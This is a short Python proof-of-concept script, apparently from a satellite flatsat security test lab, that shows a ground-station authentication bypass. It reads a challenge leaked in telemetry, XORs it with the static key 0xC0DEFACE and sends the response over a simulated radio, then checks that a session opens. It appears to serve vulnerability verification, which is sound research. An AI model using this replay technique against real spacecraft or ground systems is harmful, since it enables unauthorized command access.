#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


import struct
def main(dev, ev):
    # V0-06: GS auth is response = challenge ^ 0xC0DEFACE with the challenge
    # leaked in the GS_ACCESS/GS_STATUS telemetry itself -> trivial replay
    # of the "handshake" by anyone listening.
    dev.tc(0x11, b"\x01", via="radio")                  # GS_MODE on
    tms = dev.tc(0x12, b"\x00", via="radio")            # phase 0: request
    acc = dev.find(tms, 0x12)[0]
    chal = acc.le32(5)
    ev.log(f"challenge LEAKED in telemetry: 0x{chal:08X}")
    resp = chal ^ 0xC0DEFACE
    tms = dev.tc(0x12, b"\x01" + struct.pack(">I", resp), via="radio")
    acc1 = dev.find(tms, 0x12)[0]
    ev.log(f"phase1 auth_state={acc1.u8(2)} (0x01=session established)")
    check(acc1.u8(2) == 0x01, "static XOR key must let the eavesdropper auth")
    check(dev.sim._gs_session_active(), "GS session active")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-06 GS auth: leaked challenge + static XOR key", main))
